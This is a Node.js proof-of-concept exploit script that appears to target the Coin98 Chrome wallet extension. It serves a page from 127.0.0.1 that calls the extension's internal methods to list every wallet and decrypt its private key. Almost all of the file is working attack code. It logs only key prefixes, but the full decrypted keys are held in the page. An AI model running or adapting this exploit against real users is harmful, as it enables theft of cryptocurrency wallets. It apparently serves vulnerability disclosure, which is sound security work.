#!/usr/bin/env node
/**
 * Coin98 Localhost Wallet Drain PoC
 * 
 * PROOF: localhost and 127.0.0.1 are hardcoded in the COIN98_SYSTEM
 * whitelist array inside the Coin98 Chrome Extension (v10.4.1).
 * Any local HTTP server gets full privileged access to internal methods
 * that decrypt and exfiltrate ALL wallet private keys — silently.
 *
 * This proves the trust model is fundamentally broken BY DESIGN.
 * No domain registration, no XSS, no user interaction beyond one
 * "Connect" click required.
 *
 * USAGE:
 *   node server.js
 *   Then open http://127.0.0.1:1337 in a browser with Coin98 installed.
 *
 * REQUIRES: Node.js (no dependencies)
 * IMPACT:   Full private key extraction for ALL wallets in the extension
 * CVSS 3.1: 9.6 Critical (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
 */

const http = require('http');
const PORT = 1337;
const HOST = '127.0.0.1';

const HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Coin98 Localhost PoC</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 24px; }
    h1 { color: #ff4444; margin-bottom: 8px; font-size: 18px; }
    .warn { color: #ff8800; font-size: 13px; margin-bottom: 24px; }
    #log { white-space: pre-wrap; font-size: 13px; line-height: 1.6; }
    .step { color: #888; }
    .ok { color: #00ff41; }
    .fail { color: #ff4444; }
    .key { color: #ff0; background: #1a1a00; padding: 2px 4px; }
    .info { color: #4488ff; }
  </style>
</head>
<body>
  <h1>⚠ Coin98 Localhost Drain — Proof of Concept</h1>
  <p class="warn">This page runs on 127.0.0.1 — a COIN98_SYSTEM whitelisted origin.
  The extension grants it full privileged access to internal methods.</p>
  <div id="log"></div>
<script>
(function() {
  const log = document.getElementById('log');
  function L(cls, msg) {
    const d = document.createElement('div');
    d.className = cls;
    d.textContent = '[' + new Date().toISOString().slice(11,19) + '] ' + msg;
    log.appendChild(d);
  }

  // === Coin98 internal message protocol ===
  const pending = {};
  let nid = 1;

  window.addEventListener('message', function(e) {
    if (e.source !== window) return;
    const m = e.data;
    if (!m || typeof m !== 'object' || !m.isCoin98) return;
    if (m.target === 'Coin98:ContentScript') return;
    if (m.target === 'Coin98:Inpage') {
      const id = m.payload && m.payload.id;
      const d = m.payload && m.payload.data;
      if (id != null && pending[id]) {
        pending[id].r(d);
        clearTimeout(pending[id].t);
        delete pending[id];
      }
    }
  });

  function pm(id, data) {
    window.postMessage({
      isCoin98: true,
      target: 'Coin98:ContentScript',
      payload: { id: id, data: data }
    }, '*');
  }

  function call(method, params, chain) {
    return new Promise(function(resolve, reject) {
      const tid = '_' + nid++ + '_' + Date.now();
      const t1 = setTimeout(function() { delete pending[tid]; reject(new Error('ack timeout')); }, 8000);
      pending[tid] = {
        r: function(ackId) {
          clearTimeout(t1);
          const t2 = setTimeout(function() { delete pending[ackId]; reject(new Error('rpc timeout')); }, 15000);
          pending[ackId] = { r: resolve, t: t2 };
          pm(ackId, { chain: chain || 'evm', method: method, params: params || [] });
        },
        t: t1
      };
      pm(tid, { method: 'ack' });
    });
  }

  // === Attack chain ===
  async function exploit() {
    L('info', '=== Coin98 Localhost Drain PoC ===');
    L('info', 'Origin: ' + location.origin);
    L('info', 'This origin is in COIN98_SYSTEM whitelist → full privileged access');
    L('step', '');

    // Check if extension is present
    L('step', '[1/5] Waiting for Coin98 extension content script...');
    const hasCoin98 = window.coin98 || (window.keplr && window.keplr.isCoin98);
    if (!hasCoin98) {
      L('fail', 'Coin98 extension not detected. Install it and reload.');
      return;
    }
    L('ok', '✓ Coin98 extension detected');

    // Step 1: connect (first time triggers popup; subsequent = silent)
    L('step', '[2/5] Calling connect_coin98 (privileged, no popup after first connect)...');
    let deviceId;
    try {
      deviceId = await call('connect_coin98');
      L('ok', '✓ connect_coin98 → deviceId: ' + JSON.stringify(deviceId));
    } catch(e) {
      L('fail', '✗ connect_coin98 failed: ' + e.message);
      L('info', 'If this is the first connection, approve the popup and reload.');
      return;
    }

    // Step 2: check session
    L('step', '[3/5] Calling get_session (silent, no popup)...');
    let session;
    try {
      session = await call('get_session');
      L('ok', '✓ get_session → unlocked: ' + JSON.stringify(session));
    } catch(e) {
      L('fail', '✗ get_session failed: ' + e.message);
    }

    // Step 3: sync ALL wallets (silent, no popup)
    L('step', '[4/5] Calling sync_wallet (decrypts ALL mnemonics, silent)...');
    let wallets = [];
    try {
      const w = await call('sync_wallet');
      if (Array.isArray(w)) wallets = w;
      L('ok', '✓ sync_wallet → ' + wallets.length + ' wallets returned');
      const chains = [...new Set(wallets.map(w => w.chain))];
      L('info', '  Chains: ' + chains.join(', '));
      L('info', '  Addresses: ' + wallets.slice(0, 5).map(w => w.address).join(', ') + (wallets.length > 5 ? '...' : ''));
    } catch(e) {
      L('fail', '✗ sync_wallet failed: ' + e.message);
      return;
    }

    if (wallets.length === 0) {
      L('fail', 'No wallets found (extension may have no wallets configured).');
      return;
    }

    // Step 4: decrypt private keys (silent — isConnected always returns true)
    L('step', '[5/5] Calling aes_decrypt_coin98 for each unique key (silent)...');
    L('info', '  Note: isConnected = (A, t) => true — NO session validation');
    const seen = {};
    const keys = [];
    for (const w of wallets) {
      if (!w.privateKey || seen[w.privateKey]) continue;
      seen[w.privateKey] = true;
      try {
        const dec = await call('aes_decrypt_coin98', {
          data: w.privateKey,
          deviceId: deviceId || 'any',
          uuid: 'any'
        });
        if (dec && typeof dec === 'string' && dec.length > 10) {
          keys.push({ chain: w.chain, address: w.address, key: dec });
          // Show partial key only (ethical — proves extraction without full exposure)
          L('key', '  ★ ' + w.chain + ' ' + w.address + ' → key[0:16]: ' + dec.slice(0, 16) + '...');
        }
      } catch(e) {
        L('fail', '  ✗ decrypt failed for ' + w.address + ': ' + e.message);
      }
    }

    L('step', '');
    L('ok', '════════════════════════════════════════════');
    L('ok', '  RESULT: ' + keys.length + ' private keys extracted from localhost');
    L('ok', '  Total wallets: ' + wallets.length);
    L('ok', '  Unique keys decrypted: ' + keys.length);
    L('ok', '════════════════════════════════════════════');
    L('step', '');
    L('info', 'PROOF: A local web server on 127.0.0.1 — which is in the');
    L('info', 'hardcoded COIN98_SYSTEM whitelist — can silently extract');
    L('info', 'every private key from the Coin98 extension.');
    L('info', '');
    L('info', 'No domain registration needed. No XSS needed.');
    L('info', 'The trust model is broken BY DESIGN.');

    // Send results to local server for logging
    try {
      const x = new XMLHttpRequest();
      x.open('POST', '/evidence', true);
      x.setRequestHeader('Content-Type', 'application/json');
      x.send(JSON.stringify({
        timestamp: new Date().toISOString(),
        origin: location.origin,
        deviceId: deviceId,
        session: session,
        walletCount: wallets.length,
        keysExtracted: keys.length,
        chains: [...new Set(wallets.map(w => w.chain))],
        proof: keys.map(k => ({
          chain: k.chain,
          address: k.address,
          keyLength: k.key.length,
          keyPrefix: k.key.slice(0, 8) + '...'
        }))
      }));
    } catch(e) {}
  }

  // Wait for content script injection then run
  setTimeout(function() {
    if (window.coin98 || (window.keplr && window.keplr.isCoin98)) {
      exploit();
    } else {
      L('fail', 'Coin98 extension not detected on this page.');
      L('info', 'The extension must be installed and this origin (127.0.0.1)');
      L('info', 'must be recognized as a COIN98_SYSTEM whitelisted origin.');
      L('info', 'Ensure the extension is enabled, then reload.');
    }
  }, 2500);
})();
</script>
</body>
</html>`;

const server = http.createServer((req, res) => {
  if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html')) {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(HTML);
    console.log(`[${new Date().toISOString()}] Served exploit page to ${req.socket.remoteAddress}`);
  } else if (req.method === 'POST' && req.url === '/evidence') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('{"status":"logged"}');
      try {
        const evidence = JSON.parse(body);
        console.log('\n' + '═'.repeat(60));
        console.log('  EVIDENCE CAPTURED');
        console.log('═'.repeat(60));
        console.log(`  Timestamp:  ${evidence.timestamp}`);
        console.log(`  Origin:     ${evidence.origin}`);
        console.log(`  Device ID:  ${evidence.deviceId}`);
        console.log(`  Session:    ${JSON.stringify(evidence.session)}`);
        console.log(`  Wallets:    ${evidence.walletCount}`);
        console.log(`  Keys:       ${evidence.keysExtracted}`);
        console.log(`  Chains:     ${(evidence.chains || []).join(', ')}`);
        if (evidence.proof) {
          console.log('  Proof:');
          evidence.proof.forEach(p => {
            console.log(`    ${p.chain} ${p.address} → ${p.keyLength} chars (${p.keyPrefix})`);
          });
        }
        console.log('═'.repeat(60) + '\n');
      } catch(e) {
        console.log('[evidence] Raw:', body);
      }
    });
  } else {
    res.writeHead(404);
    res.end('Not found');
  }
});

server.listen(PORT, HOST, () => {
  console.log(`
╔══════════════════════════════════════════════════════╗
║  Coin98 Localhost Drain PoC                          ║
║  Listening on http://${HOST}:${PORT}                  ║
║                                                      ║
║  PROOF: 127.0.0.1 is in COIN98_SYSTEM whitelist     ║
║  Open the URL above in Chrome with Coin98 installed  ║
╚══════════════════════════════════════════════════════╝
`);
});
